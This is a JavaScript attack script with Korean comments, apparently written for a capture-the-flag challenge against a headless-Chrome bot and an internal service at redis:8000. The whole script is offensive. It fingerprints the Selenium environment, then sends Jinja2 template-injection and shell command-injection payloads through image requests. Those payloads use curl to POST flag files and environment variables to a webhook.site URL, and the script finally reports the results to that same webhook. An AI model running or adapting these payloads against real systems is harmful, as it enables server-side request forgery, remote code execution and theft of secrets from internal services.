(async () => {
    const WEBHOOK = 'https://webhook.site/144fdef3-ea07-4316-bff4-7619115f30f3'; // 본인의 웹훅
    const TARGET_HOST = 'http://redis:8000';

    // 1. Selenium / Chrome Headless 환경 분석
    // 봇이 플래그를 JS 변수로 가지고 있는지, 혹은 특이한 플러그인이 있는지 확인
    const envReport = {
        webdriver: navigator.webdriver, // true면 자동화 봇
        userAgent: navigator.userAgent,
        plugins: Array.from(navigator.plugins).map(p => p.name),
        mimeTypes: Array.from(navigator.mimeTypes).map(m => m.type),
        // Chrome Selenium이 남기는 흔적 변수들 확인
        cdc_vars: Object.keys(window).filter(k => k.match(/^[a-z]{3}_[a-zA-Z0-9]{22}_/)), 
        // Chrome devtools protocol 포트가 열려있는지 재확인 (혹시 9222가 아니라 다른 포트일수도?)
        // (이건 생략, 지난번 스캔으로 없음을 확인했음)
    };

    // 2. 내부 서비스 Blind Attack (SSTI & RCE)
    // 봇이 내부 서버로 요청을 보내게 만듭니다.
    // 내부 서버가 취약하다면, 우리 웹훅으로 '역연결(Reverse Connection)'을 시도할 것입니다.
    
    // 공격할 파라미터 후보 (내부 앱이 뭘 받을지 모르니 다 찔러봅니다)
    const params = ['q', 'query', 'search', 'name', 'url', 'id', 'cmd', 'exec'];
    
    // 공격 페이로드 (Jinja2, Python, Shell Injection)
    // 성공 시 웹훅으로 요청을 보내도록 설계됨
    const payloads = [
        // [SSTI] Jinja2: 기본 확인
        `{{ 7*7 }}`, 
        // [SSTI] Jinja2: Config 유출 (Flask)
        `{{ config }}`,
        // [SSTI] Jinja2: OOB (Out-of-Band) Data Exfiltration via Curl
        // 내부 서버가 curl을 실행해서 웹훅으로 /app/flag나 환경변수를 보냄
        `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('curl -X POST -d @/app/flag ${WEBHOOK}').read() }}`,
        `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('curl -X POST -d "$(env)" ${WEBHOOK}').read() }}`,
        // [RCE] Command Injection
        `; curl -X POST -d @/flag ${WEBHOOK}`,
        `| curl -X POST -d @/flag ${WEBHOOK}`,
        `$(curl -X POST -d @/flag ${WEBHOOK})`
    ];

    // Blind 공격 실행 함수 (Image 태그 사용 - CORS 무시하고 요청 전송 가능)
    const triggerExploit = (param, payload) => {
        const encodedPayload = encodeURIComponent(payload);
        const url = `${TARGET_HOST}/?${param}=${encodedPayload}`;
        
        // 이미지 태그를 생성하여 GET 요청 발사
        // 응답을 읽을 순 없지만, 페이로드가 서버에 도달해서 실행만 되면 됨
        new Image().src = url;
    };

    // 모든 조합 발사
    params.forEach(param => {
        payloads.forEach(payload => {
            triggerExploit(param, payload);
        });
    });
    
    // 특별 케이스: 경로 자체가 취약할 수 있음 (예: http://redis:8000/{{7*7}})
    payloads.forEach(payload => {
        new Image().src = `${TARGET_HOST}/${encodeURIComponent(payload)}`;
    });

    // 분석 리포트 전송
    fetch(WEBHOOK, {
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify({
            msg: "Selenium Analysis & Blind SSTI Fuzzing",
            env: envReport,
            target: TARGET_HOST,
            attackStatus: "Payloads Sent (Check your webhook for incoming requests from internal IP)",
            location: window.location.href
        })
    });
})();
